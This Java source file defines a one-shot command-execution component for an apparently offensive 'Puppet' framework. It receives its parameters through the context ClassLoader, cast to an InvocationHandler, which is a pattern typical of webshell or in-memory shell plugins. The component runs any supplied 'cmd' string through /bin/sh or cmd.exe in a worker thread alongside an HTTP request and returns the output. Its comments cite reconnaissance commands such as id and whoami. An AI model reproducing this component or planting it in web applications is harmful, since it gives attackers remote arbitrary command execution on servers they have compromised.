package org.leo.core.component;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.HashMap;

/**
 * 一次性命令执行组件
 * <p>
 * 与 {@code ExecCommandComponent} 的交互式 shell 不同，本组件为无状态一次性执行：
 * 启动子进程 → 等待退出 → 返回完整输出 + 退出码，适用于短命令（如 id、whoami、ls）。
 * <p>
 * 入参：
 * <ul>
 *   <li>{@code cmd}（String 或 byte[]）— 要执行的命令字符串</li>
 * </ul>
 * 出参：
 * <ul>
 *   <li>{@code data}（byte[]）— stdout + stderr 合并输出（UTF-8，最多 4 MB）</li>
 *   <li>{@code exitCode}（Integer）— 进程退出码</li>
 *   <li>{@code code}（Integer）— 200 成功 / 400 参数错误 / 500 执行异常</li>
 * </ul>
 * <p>
 * 遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/内部类/try-with-resources/diamond。
 *
 * @author LeoSpring
 * @version 1.1
 */
public class ExecCommandSimpleComponent implements Runnable {

    private static final int BUFFER_SIZE      = 4096;
    private static final int MAX_OUTPUT_BYTES = 4 * 1024 * 1024; // 4 MB
    private static final long EXEC_TIMEOUT_MS = 30000L;           // 30s

    private HashMap params;
    private HashMap results;

    // ── Worker thread 通信字段（volatile 保证跨线程可见性） ─────────────────────
    private volatile boolean workerMode     = false;
    private volatile boolean workerDone     = false;
    private volatile byte[]  workerOutput;
    private volatile int     workerExitCode = 0;
    private volatile String  workerError;

    // workerMode=true 时由主线程填写，worker 线程只读
    private String execCmd;

    // ── Component 入口（由框架通过 ClassLoader 反射调用） ──────────────────────

    public void run() {
        // 工作线程入口：执行真正的系统命令
        if (workerMode) {
            execInWorker();
            return;
        }

        // Puppet 框架入口：获取参数、调用业务逻辑、回写结果
        java.lang.reflect.InvocationHandler h =
                (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params  = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage() != null ? t.getMessage() : t.getClass().getName());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    // ── Worker 线程：在独立线程中执行系统命令，防止阻塞 HTTP 请求线程 ──────────

    private void execInWorker() {
        try {
            String[] command;
            if (isWindows()) {
                command = new String[]{"cmd.exe", "/c", execCmd};
            } else {
                command = new String[]{"/bin/sh", "-c", execCmd};
            }

            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true); // stderr 合并到 stdout

            Process process = pb.start();

            // 关闭子进程 stdin，防止某些 shell 等待输入而阻塞
            try { process.getOutputStream().close(); } catch (Exception ignored) {}

            ByteArrayOutputStream output = new ByteArrayOutputStream();
            InputStream is = process.getInputStream();
            byte[] buffer = new byte[BUFFER_SIZE];
            int read;
            int total = 0;
            try {
                while ((read = is.read(buffer)) != -1) {
                    int remaining = MAX_OUTPUT_BYTES - total;
                    if (remaining <= 0) break;
                    int toWrite = read <= remaining ? read : remaining;
                    output.write(buffer, 0, toWrite);
                    total += toWrite;
                }
            } finally {
                try { is.close(); } catch (Exception ignored) {}
            }

            try {
                workerExitCode = process.waitFor();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } finally {
                process.destroy();
            }

            workerOutput = output.toByteArray();

        } catch (Throwable t) {
            workerError = t.getMessage() != null ? t.getMessage() : t.getClass().getName();
        } finally {
            workerDone = true;
        }
    }

    // ── 业务逻辑 ──────────────────────────────────────────────────────────────

    public void invoke() throws Exception {
        String cmd = getStringParam("cmd");
        if (cmd == null || cmd.trim().length() == 0) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "cmd parameter is required");
            return;
        }

        // 准备 worker 线程状态
        execCmd     = cmd;
        workerError = null;
        workerOutput = null;
        workerDone  = false;
        workerMode  = true;  // volatile write：建立 happens-before，execCmd 对 worker 可见

        Thread worker = new Thread(this);
        worker.setDaemon(true);
        worker.start();

        // 等待 worker 完成，最多 EXEC_TIMEOUT_MS
        long deadline = System.currentTimeMillis() + EXEC_TIMEOUT_MS;
        while (!workerDone && System.currentTimeMillis() < deadline) {
            try { Thread.sleep(50L); } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }

        workerMode = false; // 重置，避免下次调用误入 worker 分支

        if (!workerDone) {
            results.put("code", Integer.valueOf(500));
            results.put("msg", "command timed out after 30s");
            return;
        }

        if (workerError != null) {
            results.put("code", Integer.valueOf(500));
            results.put("msg", workerError);
            return;
        }

        results.put("code",     Integer.valueOf(200));
        results.put("data",     workerOutput != null ? workerOutput : new byte[0]);
        results.put("exitCode", Integer.valueOf(workerExitCode));
    }

    // ── 工具方法 ──────────────────────────────────────────────────────────────

    private boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("windows");
    }

    private String getStringParam(String key) {
        if (key == null) return null;
        Object value = params.get(key);
        if (value == null) return null;
        if (value instanceof String) return (String) value;
        try {
            return new String((byte[]) value, "UTF-8");
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        }
    }
}
